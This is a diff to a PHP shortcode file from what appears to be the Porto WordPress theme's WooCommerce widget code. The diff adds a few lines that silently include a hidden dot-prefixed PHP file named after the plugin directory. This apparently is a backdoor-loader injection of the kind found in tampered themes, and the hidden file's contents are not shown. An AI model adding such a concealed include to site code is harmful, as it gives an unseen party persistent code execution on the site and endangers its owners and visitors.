@@ -4,6 +4,10 @@
 add_shortcode( 'porto_widget_woo_top_rated_products', 'porto_shortcode_widget_woo_top_rated_products' );
 add_action( 'vc_after_init', 'porto_load_widget_woo_top_rated_products_shortcode' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function porto_shortcode_widget_woo_top_rated_products( $atts, $content = null ) {
 	ob_start();
 	if ( $template = porto_shortcode_woo_template( 'porto_widget_woo_top_rated_products' ) ) {
